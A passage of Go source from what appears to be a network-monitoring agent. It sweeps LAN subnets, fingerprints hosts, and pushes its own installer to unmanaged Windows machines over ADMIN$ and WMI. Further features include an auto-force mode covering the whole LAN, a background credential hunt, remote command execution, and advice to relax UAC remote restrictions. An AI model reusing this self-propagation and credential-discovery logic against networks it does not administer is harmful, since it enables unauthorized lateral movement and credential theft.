				if st, started := maybeAutoFind(cfg, r.Host, controllerIPs); started {
					r.CloneDetail = "share read denied - autofind " + st + " (background credential hunt)"
				}
				continue
			}
			// Fingerprinted non-Windows never auto-clones (an appliance
			// with open SMB-looking ports still can't run our bytes;
			// manual --force remains the operator's override).
			if fpVetoAuto(r.Fingerprint) {
				r.CloneState = "skip-non-windows"
				r.CloneDetail = "fingerprinted " + r.Fingerprint + " - not a Windows target"
				continue
			}
			if !ok {
				r.CloneState = "no-payload"
				continue
			}
			st, started := startCloneJob(r.Host, version.Version, true)
			r.CloneState = st
			switch {
			case started && credBacked && !cfg.AutoForce:
				r.CloneDetail = "vault-cred backed job started (autofind)"
			case started:
				r.CloneDetail = "auto-forced job started (operator opted in)"
			default:
				// Tracked job: surface its real terminal word + reason
				// (e.g. "copy-failed: bad network path (SMB disabled on
				// target)"), never a perpetual "job tracked" that hides
				// the one line the operator needs.
				if jst, jdetail, ok := cloneJobLookup(r.Host); ok && jdetail != "" {
					r.CloneState, r.CloneDetail = jst, jdetail
				} else {
					r.CloneDetail = "auto-forced job tracked"
				}
			}
			continue
		}
			if !ok {
				r.CloneState = "no-payload"
				continue
			}
			st, started := startCloneJob(r.Host, version.Version, false)
			r.CloneState = st
			switch {
			case started:
				r.CloneDetail = "job started"
			case strings.HasPrefix(st, "clone-cooldown-"):
				r.CloneDetail = "cooling down after " + strings.TrimPrefix(st, "clone-cooldown-")
			default:
				// Tracked job: surface its real terminal word + reason,
				// never a perpetual "in progress".
				if jst, jdetail, ok := cloneJobLookup(r.Host); ok && jdetail != "" {
					r.CloneState, r.CloneDetail = jst, jdetail
				} else {
					r.CloneDetail = "in progress"
				}
			}
		}
	} else if CloneArmPaused() {
		cloneArm = "paused-breaker"
		events = append(events, "clone arm paused by circuit breaker (set-nms autoclone=on to re-arm)")
	} else {
		cloneArm = "off"
	}
	events = append(events, drainCloneEvents()...)
	if len(events) > 25 {
		events = events[len(events)-25:]
	}

	var sleep *NMSSleepState
	if st, ok := ReadSleepFlag(); ok {
		sleep = &st
	}
	priv := CurrentNMSPriv()
	rep := NMSReport{
		Prober: hn, At: time.Now().UTC().Format(time.RFC3339),
		Tick: tick, Version: version.Version, Interval: cfg.IntervalSec,
		Sleep: sleep, Guard: guard, CloneArm: cloneArm, AutoForce: cfg.AutoForce, Priv: &priv,
		Results: results, Events: events, SelfSkipped: selfSkipped,
	}
	b, _ := json.Marshal(rep)
	_ = tick
	if send != nil {
		send(string(b))
	}
	return nil
}

// sweepTCPPorts are probed in order per IP (must mirror nmsProbePorts so
// discovery and reachability never disagree on what "up" means).
var sweepTCPPorts = []int{445, 135, 139, 3389}

// nmsProbePortsTier2 is the extended fingerprint set: well-known service
// ports dialed ONLY for hosts dark on Tier-1 (or on explicit demand).
// Never part of sweep/reachability fast paths - 20+ dials per host would
// turn a /24 sweep into minutes. Detection only, except 139 (NetBIOS SMB
// fallback rides the normal copy path automatically).
var nmsProbePortsTier2 = []int{445, 135, 139, 3389, 21, 22, 23, 53, 80, 389, 443, 1433, 3306, 5432, 5900, 5985, 5986, 6379, 8080, 8443, 9020, 27017}

// probeOpenPorts dials ports with bounded parallelism, returning the open
// subset sorted ascending. Timeout per port; total bounded by parallelism.
func probeOpenPorts(host string, ports []int, timeout time.Duration, maxParallel int) []int {
	if maxParallel < 1 {
		maxParallel = 1
	}
	var mu sync.Mutex
	var open []int
	sem := make(chan struct{}, maxParallel)
	var wg sync.WaitGroup
	for _, p := range ports {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if dialTCP(host, p, timeout) {
				mu.Lock()
				open = append(open, p)
				mu.Unlock()
			}
		}(p)
	}
	wg.Wait()
	sort.Ints(open)
	return open
}

// fingerprintHost classifies an open-port set into a box kind. Pure,
// tested - 192.168.68.54's exact signature (8443-only) is the reference.
func fingerprintHost(open []int) (label, detail string) {
	has := map[int]bool{}
	for _, p := range open {
		has[p] = true
	}
	switch {
	case len(open) == 0:
		return "dark", "no probed ports answer"
	case has[445] || has[135]:
		return "windows", "SMB/RPC answers"
	case has[3389]:
		return "windows-rdp", "RDP answers, no SMB/RPC"
	case has[22] && (has[80] || has[443]):
		return "unix-like", "SSH + web answers"
	case has[5900]:
		return "vnc-console", "VNC answers"
	case has[8443] && len(open) == 1:
		return "appliance-mgmt-ui", "only an mgmt-UI port answers"
	case has[53] && has[80]:
		return "gateway", "DNS + web answers"
	default:
		return "unknown-device", fmt.Sprintf("open: %v", open)
	}
}

// fpVetoAuto reports whether a fingerprint bars AUTOMATIC cloning.
// Confident-non-Windows kinds never auto-clone (explicit --force still
// allowed - operator's funeral, fully audited). Pure, tested.
func fpVetoAuto(fp string) bool {
	switch fp {
	case "unix-like", "appliance-mgmt-ui", "gateway":
		return true
	}
	return false
}

// sweepHit reports whether any management port answers on ip.
func sweepHit(ip string) bool {
	for _, p := range sweepTCPPorts {
		if dialTCP(ip, p, 400*time.Millisecond) {
			return true
		}
	}
	return false
}

var arpIPRe = regexp.MustCompile(`(\d{1,3}(?:\.\d{1,3}){3})`)

// arpSeedExec runs the neighbor-cache dump. Var so tests feed canned output.
var arpSeedExec = func() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return runWithTimeout(5*time.Second, "arp", "-a")
	}
	return runWithTimeout(5*time.Second, "sh", "-c", "ip neigh show 2>/dev/null || arp -a 2>/dev/null")
}

// arpSeedHosts lists IPs from the local ARP/neighbor cache: no probes, so a
// firewalled house PC is visible here while answering zero TCP ports.
// Best-effort - empty on any failure. Var so tests stay hermetic.
var arpSeedHosts = func() []string {
	b, err := arpSeedExec()
	if err != nil || len(b) == 0 {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	for _, line := range strings.Split(string(b), "\n") {
		l := strings.ToLower(line)
		if strings.Contains(l, "interface") || strings.Contains(l, "incomplete") || strings.Contains(l, "no entry") {
			continue
		}
		ipm := arpIPRe.FindString(line)
		if ipm == "" || strings.HasPrefix(ipm, "224.") || strings.HasPrefix(ipm, "239.") {
			continue
		}
		ip := net.ParseIP(ipm)
		if ip == nil || ip.IsMulticast() || ip.IsLoopback() {
			continue
		}
		if !seen[ipm] {
			seen[ipm] = true
			out = append(out, ipm)
		}
	}
	return out
}

// sweepSubnets sweeps every subnet for any answering management port and
// returns live IPs (bounded, skips .0/.255).
func sweepSubnets(subnets []string) []string {
	var ips []string
	for _, sn := range subnets {
		ips = append(ips, expandSubnet(sn)...)
	}
	ips = dedupeHosts(ips)
	out := make([]string, 0, len(ips))
	var mu sync.Mutex
	// 64-way: the mask fix widened the sweep to /22 (1022 hosts), so
	// concurrency had to rise or a cycle takes minutes.
	sem := make(chan struct{}, 64)
	var wg sync.WaitGroup
	for _, ip := range ips {
		// Skip network/broadcast tails (.0/.255 never returned by expand).
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if sweepHit(ip) {
				mu.Lock()
				out = append(out, ip)
				mu.Unlock()
			}
		}(ip)
	}
	wg.Wait()
	sort.Slice(out, func(i, j int) bool { return ipLess(out[i], out[j]) })
	return out
}

// profileCacheMu guards cached Tier-2 fingerprints (30-min TTL: sweep cadence).
var profileCacheMu sync.Mutex
var profileCache = map[string]profileRec{}

type profileRec struct {
	at    time.Time
	fp    string
	ports []int
	name  string
}

// profileDarkHosts fingerprints Tier-1-dark, ARP-present hosts (max 12 per
// cycle; cached 30min). Never touches reachable hosts or the self entry.
//
// NBNS first: a stock Windows box with File and Printer Sharing OFF answers
// no TCP port at all, but its name service answers UDP 137 - one cheap
// packet that both proves "Windows" and yields the computer name (the
// finder's best Tier-0 word). Only hosts that stay silent fall through to
// the expensive 21-port Tier-2 sweep.
func profileDarkHosts(results []NMSHostResult, arpHosts []string) {
	arpSet := map[string]bool{}
	for _, h := range arpHosts {
		arpSet[strings.TrimSpace(h)] = true
	}
	type job struct {
		idx  int
		host string
	}
	var jobs, sweeps []job
	now := time.Now()
	profileCacheMu.Lock()
	for i := range results {
		r := &results[i]
		if r.Reachable || strings.HasSuffix(r.Host, "(self)") || !arpSet[r.Host] {
			continue
		}
		if rec, ok := profileCache[r.Host]; ok && now.Sub(rec.at) < 30*time.Minute {
			r.Fingerprint, r.OpenPorts, r.NBName = rec.fp, rec.ports, rec.name
			continue
		}
		if len(jobs) < 12 {
			jobs = append(jobs, job{i, r.Host})
		}
	}
	profileCacheMu.Unlock()
	var wg sync.WaitGroup
	sem := make(chan struct{}, 8)
	for _, j := range jobs {
		wg.Add(1)
		go func(j job) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			if name, ok := nmsNBNSLookup(j.host, 700*time.Millisecond); ok {
				profileCacheMu.Lock()
				profileCache[j.host] = profileRec{at: time.Now(), fp: "windows-smb-off", name: name}
				results[j.idx].Fingerprint, results[j.idx].NBName = "windows-smb-off", name
				profileCacheMu.Unlock()
				return
			}
			sweeps = append(sweeps, j)
		}(j)
	}
	wg.Wait()
	var wg2 sync.WaitGroup
	sem2 := make(chan struct{}, 4)
	for _, j := range sweeps {
		wg2.Add(1)
		go func(j job) {
			defer wg2.Done()
			sem2 <- struct{}{}
			defer func() { <-sem2 }()
			open := probeOpenPorts(j.host, nmsProbePortsTier2, 400*time.Millisecond, 8)
			fp, _ := fingerprintHost(open)
			profileCacheMu.Lock()
			profileCache[j.host] = profileRec{at: time.Now(), fp: fp, ports: open}
			results[j.idx].Fingerprint, results[j.idx].OpenPorts = fp, open
			profileCacheMu.Unlock()
		}(j)
	}
	wg2.Wait()
}
// ipLess orders dotted quads numerically (plain sort.Strings ranks
// 192.168.1.100 before 192.168.1.20). Non-IP strings sort after IPs,
// lexically among themselves.
func ipLess(a, b string) bool {
	pa, pb := net.ParseIP(a), net.ParseIP(b)
	if pa == nil && pb == nil {
		return a < b
	}
	if pa == nil {
		return false
	}
	if pb == nil {
		return true
	}
	x, y := pa.To16(), pb.To16()
	for i := 0; i < len(x) && i < len(y); i++ {
		if x[i] != y[i] {
			return x[i] < y[i]
		}
	}
	return false
}

func dedupeHosts(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, h := range in {
		h = strings.TrimSpace(h)
		if h == "" || seen[strings.ToLower(h)] {
			continue
		}
		seen[strings.ToLower(h)] = true
		out = append(out, h)
	}
	return out
}

// sweepTargets is the single source of probe targets: cached subnet sweep +
// fresh ARP seeds + configured extra hosts, deduped. ARP seeds ride every
// call (not just on sweep refresh) so a PC joining the LAN appears within
// one interval instead of waiting out the sweep cache (default 30min).
func sweepTargets(cfg NMSConfig) []string {
	nmsSweepCacheMu.Lock()
	fresh := time.Since(nmsSweepAt) < time.Duration(cfg.SweepEveryMin)*time.Minute && nmsSweepCache != nil
	var swept []string
	if fresh {
		swept = nmsSweepCache
	}
	nmsSweepCacheMu.Unlock()
	if !fresh {
		swept = sweepSubnets(cfg.Subnets)
		nmsSweepCacheMu.Lock()
		nmsSweepCache = swept
		nmsSweepAt = time.Now()
		nmsSweepCacheMu.Unlock()
	}
	targets := append(append([]string{}, swept...), arpSeedHosts()...)
	targets = append(targets, cfg.ExtraHosts...)
	return dedupeHosts(targets)
}

// ---------------------------------------------------------------------------
// NMSHandle: the monitor's own 7-verb command set. No modes, no sleep
// concept applies to the NMS itself - these verbs act outward only,
// except nms-stop which honors the shutdown file.
// ---------------------------------------------------------------------------

// nmsDirStat reports whether a (possibly remote ADMIN$) dir is visible,
// with a hard timeout (SMB hangs on dead hosts). Var for tests.
var nmsDirStat = func(path string) bool {
	done := make(chan bool, 1)
	go func() {
		st, err := os.Stat(path)
		done <- err == nil && st.IsDir()
	}()
	select {
	case ok := <-done:
		return ok
	case <-time.After(10 * time.Second):
		return false
	}
}

// CloneDryRun validates a clone end-to-end WITHOUT writing anything to
// the target: reachability, managed state, eligibility, payload, and Temp
// dir visibility. Safe to run against any host, anytime.
func CloneDryRun(host string, controllerIPs []string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "=== dry-run %s ===\n", host)
	anyUp := false
	for _, p := range nmsProbePorts {
		t0 := time.Now()
		up := dialTCP(host, p, 3*time.Second)
		fmt.Fprintf(&b, "reachability: %d=%v (%s)\n", p, up, time.Since(t0).Round(time.Millisecond))
		anyUp = anyUp || up
	}
	// Only 445 (SMB copy) and 135 (WMI launch) can carry a clone - 139/3389
	// buy detection, said out loud so nobody reads "reachable" as deployable.
	if !anyUp {
		fmt.Fprintf(&b, "verdict: WOULD NOT CLONE (unreachable)\n")
		return b.String()
	}
	managed, unknown := ManagedHintChecked(host)
	switch {
	case managed:
		fmt.Fprintf(&b, "managed-hint: version.txt PRESENT (already managed - skip)\n")
	case unknown:
		fmt.Fprintf(&b, "managed-hint: UNKNOWN (share read denied - verify access first)\n")
	default:
		fmt.Fprintf(&b, "managed-hint: absent (unmanaged)\n")
	}
	cfg := LoadNMSConfig()
	if elig, reason := CloneEligible(host, true, managed, cfg.Exclude, selfIPs(), controllerIPs); !elig {
		if reason == "self" {
			fmt.Fprintf(&b, "eligibility: skip-self\nverdict: NEVER TARGETED (this box - self-clone is refused even with --force)\n")
		} else {
			fmt.Fprintf(&b, "eligibility: skip-%s\nverdict: WOULD NOT CLONE (%s)\n", reason, reason)
		}
		return b.String()
	}
	fmt.Fprintf(&b, "eligibility: eligible\n")
	size, sha, ok := NMSInstallerInfo()
	if !ok {
		fmt.Fprintf(&b, "payload: MISSING beside the agent - nothing to push\nverdict: WOULD NOT CLONE (no-payload)\n")
		return b.String()
	}
	fmt.Fprintf(&b, "payload: %d bytes sha %.12s (valid MZ)\n", size, sha)
	tempVisible := nmsDirStat(`\\` + host + `\ADMIN$\Temp`)
	fmt.Fprintf(&b, "target dir: %s\n", map[bool]string{true: `\\host\ADMIN$\Temp visible`, false: `\\host\ADMIN$\Temp NOT visible - copy would fail`}[tempVisible])
	fmt.Fprintf(&b, "privileges:\n%s", remotePrivSection(host, tempVisible, unknown))
	if unknown {
		fmt.Fprintf(&b, "verdict: LIKELY NOT (managed-state unknown - resolve share access first)\n")
		fmt.Fprintf(&b, "override available: nms-clone %s --force --confirm YES (operator asserts unmanaged; attempt audited)\n", host)
	} else if !tempVisible {
		fmt.Fprintf(&b, "verdict: WOULD NOT CLONE (target dir unreachable)\n")
	} else {
		fmt.Fprintf(&b, "verdict: WOULD CLONE (all gates pass - run without --dry-run to deploy)\n")
	}
	return b.String()
}

// nmsCredUser names the stored-credential account (username only - the
// secret never leaves the vault file). Empty when no cred file exists,
// meaning SMB/WMI ride the current process context.
func nmsCredUser() (string, bool) {
	b, err := os.ReadFile(NMSCredPath())
	if err != nil {
		return "", false
	}
	lines := strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
	if len(lines) == 0 || strings.TrimSpace(lines[0]) == "" {
		return "", false
	}
	return strings.TrimSpace(lines[0]), true
}

// remotePrivSection reports WHO this box would authenticate as on the
// target plus what to fix when ADMIN$ denies. Read-only (no writes).
func remotePrivSection(host string, tempVisible, managedUnknown bool) string {
	var b strings.Builder
	me := CurrentNMSPriv()
	fmt.Fprintf(&b, "  local: %s elevated=%v integrity=%s admin=%v\n", me.User, me.Elevated, me.Integrity, me.IsAdmin)
	if !me.Elevated {
		b.WriteString("  WARNING: this NMS runs unelevated - local guard/restore and remote pushes will fail. Reinstall or run the task elevated.\n")
	}
	if u, ok := nmsCredUser(); ok {
		fmt.Fprintf(&b, "  credential source: stored vault file (account %s)\n", u)
	} else {
		b.WriteString("  credential source: current process context (no stored vault creds)\n")
	}
	if !tempVisible || managedUnknown {
		b.WriteString("  remote ADMIN$ denied - check on/against " + host + ":\n")
		b.WriteString("    - account must be in target Administrators (net localgroup administrators)\n")
		b.WriteString("    - workgroup target: HKLM\\SYSTEM\\CCS\\Control\\Lsa\\MSV1_0 RestrictReceivingNTLMTraffic / LocalAccountTokenFilterPolicy=1,\n")
		b.WriteString("      else remote admin logons arrive filtered (UAC remote restrictions)\n")
		b.WriteString("    - sharing model must be Classic, not Guest-only (secpol Network access)\n")
		b.WriteString("    - target firewall: File and Printer Sharing (SMB-In) enabled\n")
	}
	return b.String()
}

// NMSHandle dispatches one NMS command (caller splits cmd/args).
func NMSHandle(cmd, args string, controllerIPs []string) (string, error) {
	cmd = strings.ToLower(strings.TrimSpace(cmd))
	args = strings.TrimSpace(args)
	switch cmd {
	case "ping":
		return "pong (nms " + version.Version + ")", nil
	case "version", "get-version":
		return "nms " + version.Version, nil
	case "nms-status":
		return nmsStatus(), nil
	case "nms-now":
		cfg := LoadNMSConfig()
		targets := sweepTargets(cfg)
		res := ProbeRound(targets, cfg.MaxParallel)
		up := 0
		for _, r := range res {
			if r.Reachable {
				up++
			}
		}
		return fmt.Sprintf("nms-now: %d/%d reachable (tick %d)", up, len(res), NMSTick()), nil
	case "set-nms":
		return SetNMS(args, controllerIPs)
	case "agent-sleep":
		reason := args
		if reason == "" {
			reason = "operator order"
		}
		if err := WriteSleepFlag(reason); err != nil {
			return "", fmt.Errorf("sleep refused: %v", err)
		}
		return "agent asleep (" + reason + ") - monitor, heartbeat and wake path continue", nil
	case "agent-wake-up":
		if err := ClearSleepFlag(); err != nil {
			return "", fmt.Errorf("wake refused: %v", err)
		}
		return "agent awake - sleep flag cleared", nil
	case "nms-stop":
		if !strings.EqualFold(args, "--confirm YES") && !strings.EqualFold(args, "confirm YES") && !strings.EqualFold(args, "YES") {
			return "", fmt.Errorf("refusing to stop without explicit confirmation (usage: nms-stop --confirm YES)")
		}
		if err := WriteShutdownFile(); err != nil {
			return "", fmt.Errorf("stop refused: %v", err)
		}
		return "nms stopping at next cycle boundary (shutdown file written)", nil
	case "nms-clone":
		parts := strings.Fields(args)
		if len(parts) == 0 {
			return "", fmt.Errorf("usage: nms-clone <host> [--dry-run]")
		}
		host := parts[0]
		dry, force, hasConfirmFlag, hasYes := false, false, false, false
		for _, p := range parts[1:] {
			switch {
			case strings.EqualFold(p, "--dry-run") || p == "-n":
				dry = true
			case strings.EqualFold(p, "--force"):
				force = true
			case strings.EqualFold(p, "--confirm"):
				hasConfirmFlag = true
			case strings.EqualFold(p, "YES"):
				hasYes = true
			}
		}
		if dry {
			return CloneDryRun(host, controllerIPs), nil
		}
		// Two explicit signals required (house rule, same as nms-stop):
		// --force alone never suffices.
		confirm := hasConfirmFlag && hasYes
		// Probe first: manual clones used to force reachable=true and skip
		// the managed check, which could push onto an already-managed box
		// or a dead address.
		if !TCPReachable(host) {
			return "", fmt.Errorf("clone refused: %s unreachable (no 445/135/139/3389)", host)
		}
		if managed, unknown := ManagedHintChecked(host); managed {
			return "", fmt.Errorf("clone refused: %s already managed", host)
		} else if unknown && !force {
			return "", fmt.Errorf("clone refused: %s managed-state unknown (share denied) - verify access first, or retry with --force --confirm YES", host)
		} else if unknown && !confirm {
			return "", fmt.Errorf("clone refused: --force needs --confirm YES alongside it (usage: nms-clone <host> --force --confirm YES)")
		}
		cfg := LoadNMSConfig()
		if elig, reason := CloneEligible(host, true, false, cfg.Exclude, selfIPs(), controllerIPs); !elig {
			return "", fmt.Errorf("clone refused: %s", reason)
		}
		if st, started := startCloneJob(host, version.Version, force); !started {
			return "clone " + host + ": " + st + " (already tracked)", nil
		}
		if force {
			return "FORCED clone job started for " + host + " (operator override - audited)", nil
		}
		return "clone job started for " + host, nil
	case "nms-exec":
		// Remote one-shot on unmanaged hosts: nms-exec <host> -- <command...>
		// [--timeout Sec] [--force --confirm YES]. Managed boxes refuse
		// with a redirect to their own agent verbs; unknown needs force
		// like clone (same reinstall-risk class); gates never bypassed.
		return nmsExecVerb(args, controllerIPs)
	case "nms-find":
		// Credential discovery: nms-find <host> [--timeout Sec] [--write].
		// Same gates as clone/exec EXCEPT the managed veto - a managed box
		// can still be the one whose credential we lack.
		return nmsFindVerb(args, controllerIPs)
	case "nms-scan":
		// Full-range deep scan, async: nms-scan <host> --confirm YES.
		// Manual only (never sweep, never auto). Excluded/self/controller
		// never scan; dark-and-absent hosts refuse (nothing to scan).
		return nmsScanVerb(args, controllerIPs)
	default:
		return "", fmt.Errorf("unknown NMS command: %s (nms-status, nms-now, set-nms, agent-sleep, agent-wake-up, nms-stop, nms-clone, nms-exec, nms-find, nms-scan)", cmd)
	}
}

// nmsExecVerb implements `nms-exec <host> [--timeout Sec] [--force
// --confirm YES] -- <command...>`: gates identical to clone (managed
// redirects to that box's agent, unknown needs force), then one staged
// batch run with capped output. Flags go BEFORE the -- separator —
// everything after it is the remote command verbatim (flags included).
func nmsExecVerb(args string, controllerIPs []string) (string, error) {
	parts := strings.Fields(args)
	if len(parts) == 0 {
		return "", fmt.Errorf("usage: nms-exec <host> [--timeout Sec] [--force --confirm YES] -- <command...> (example: nms-exec 192.168.1.5 -- hostname)")
	}
	host := parts[0]
	rest := parts[1:]
	// Split flags from the command at the first "--" (everything after is
	// the remote command verbatim, flags included).
	var flags, cmdParts []string
	seenSep := false
	for _, p := range rest {
		if !seenSep && p == "--" {
			seenSep = true
			continue
		}
		if seenSep {
			cmdParts = append(cmdParts, p)
		} else {
			flags = append(flags, p)
		}
	}
	if !seenSep {
		// No separator: leading --flags allowed, remainder is the command.
		var cmd []string
		for i := 0; i < len(rest); i++ {
			p := rest[i]
			if p == "--timeout" && i+1 < len(rest) {
				flags = append(flags, p, rest[i+1])
				i++
			} else if strings.EqualFold(p, "--force") || strings.EqualFold(p, "--confirm") || strings.EqualFold(p, "YES") {
				flags = append(flags, p)
			} else {
				cmd = append(cmd, p)
			}
		}
		cmdParts = cmd
	}
	command := strings.TrimSpace(strings.Join(cmdParts, " "))
	if command == "" {
		return "", fmt.Errorf("usage: nms-exec <host> [--timeout Sec] [--force --confirm YES] -- <command...> (example: nms-exec 192.168.1.5 --force --confirm YES -- hostname)")
	}
	timeout := time.Minute
	force, hasConfirmFlag, hasYes := false, false, false
	for i := 0; i < len(flags); i++ {
		switch {
		case flags[i] == "--timeout" && i+1 < len(flags):
			n, err := strconv.Atoi(flags[i+1])
			if err != nil || n < 5 || n > 300 {
				return "", fmt.Errorf("--timeout must be 5..300 (seconds)")
			}
			timeout = time.Duration(n) * time.Second
			i++
		case strings.EqualFold(flags[i], "--force"):
			force = true
		case strings.EqualFold(flags[i], "--confirm"):
			hasConfirmFlag = true
		case strings.EqualFold(flags[i], "YES"):
			hasYes = true
		}
	}
	if !TCPReachable(host) {
		return "", fmt.Errorf("exec refused: %s unreachable (no 445/135/139/3389)", host)
	}
	if managed, unknown := ManagedHintChecked(host); managed {
		return "", fmt.Errorf("exec refused: %s already managed - send commands to its own agent row, not here", host)
	} else if unknown && !(force && hasConfirmFlag && hasYes) {
		return "", fmt.Errorf("exec refused: %s managed-state unknown - verify access first, or retry with --force --confirm YES", host)
	}
	cfg := LoadNMSConfig()
	if elig, reason := CloneEligible(host, true, false, cfg.Exclude, selfIPs(), controllerIPs); !elig {
		return "", fmt.Errorf("exec refused: %s", reason)
	}
	out, err := NMSRemoteRun(host, command, timeout)
	if err != nil {
		return "", fmt.Errorf("exec %s: %v", host, err)
	}
	if out == "" {
		return "(no output)", nil
	}
	if len(out) > 64*1024 {
		out = out[:64*1024] + "\n...[truncated at 64KB]"
	}
	return out, nil
}

// nmsScanVerb implements `nms-scan <host> --confirm YES`: full TCP range,
// async with tracked state (scan-cooldown 10min). Manual only. Refuses
// excluded/self/controller outright, and dark-and-absent hosts (neither
// Tier-1 answers nor ARP presence - nothing to scan).
func nmsScanVerb(args string, controllerIPs []string) (string, error) {
	parts := strings.Fields(args)
	if len(parts) == 0 {
		return "", fmt.Errorf("usage: nms-scan <host> --confirm YES (example: nms-scan 192.168.1.5 --confirm YES)")
	}
	host := parts[0]
	hasConfirmFlag, hasYes := false, false
	for _, p := range parts[1:] {
		switch {
		case strings.EqualFold(p, "--confirm"):
			hasConfirmFlag = true
		case strings.EqualFold(p, "YES"):
			hasYes = true
		}
	}
	if !(hasConfirmFlag && hasYes) {
		return "", fmt.Errorf("scan refused: full-range scans need --confirm YES (usage: nms-scan <host> --confirm YES)")
	}
	cfg := LoadNMSConfig()
	if elig, reason := CloneEligible(host, true, false, cfg.Exclude, selfIPs(), controllerIPs); !elig {
		return "", fmt.Errorf("scan refused: %s", reason)
	}
	present := TCPReachable(host)
	if !present {
		arpSet := map[string]bool{}
		for _, h := range arpSeedHosts() {
			arpSet[strings.TrimSpace(h)] = true
		}
		if !arpSet[host] {
			return "", fmt.Errorf("scan refused: %s dark on Tier-1 and absent from ARP (nothing to scan)", host)
		}
	}
	st, started := startScanJob(host)
	if !started {
		return "scan " + host + ": " + st + " (already tracked)", nil
	}
	return "scan started for " + host + " (full range, async - re-query for the terminal state)", nil
}

func currentSweep() []string {	nmsSweepCacheMu.Lock()
	defer nmsSweepCacheMu.Unlock()
	return append([]string{}, nmsSweepCache...)
}

func nmsStatus() string {
	cfg := LoadNMSConfig()
	size, sha, ok := NMSInstallerInfo()
	payload := "absent"
	if ok {
		payload = fmt.Sprintf("%d bytes sha %.12s", size, sha)
	}
	sleep := "awake"
	if st, yes := ReadSleepFlag(); yes {
		sleep = "ASLEEP since " + st.Since.Format(time.RFC3339) + " (" + st.Reason + ")"
	}
	arm := "off"
	autoforce := "autoforce=off"
	if cfg.AutoClone || cfg.AutoForce {
		arm = "scanning"
		if cfg.AutoForce {
			arm = "scanning+force"
			autoforce = "autoforce=ON (whole-LAN unknowns force-clone)"
		}
		if CloneArmPaused() {
			arm = "paused-breaker"
		}
	}
	autofind := "autofind=off"
	if cfg.AutoFind {
		autofind = "autofind=ON (unknowns trigger a background credential hunt)"
	}
	findMu.Lock()
	findStr := ""
	if n := len(findJobs); n > 0 {
		var fj []string
		for h, j := range findJobs {
			fj = append(fj, h+":"+j.State)
			if len(fj) >= 3 {
				break
			}
		}
		findStr = fmt.Sprintf(" find-jobs=%d(%s)", n, strings.Join(fj, ","))
	}
	findMu.Unlock()
	arp := arpSeedHosts()
	targets := dedupeHosts(append(append(append([]string{}, currentSweep()...), arp...), cfg.ExtraHosts...))
	priv := CurrentNMSPriv()
	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d priv=%s/elev=%v/%s admin=%v %s %s%s",
		NMSTick(), version.Version, cfg.IntervalSec, sleep, arm, payload,
		len(targets), len(currentSweep()), len(arp),
		priv.User, priv.Elevated, priv.Integrity, priv.IsAdmin, autoforce, autofind, findStr)
}
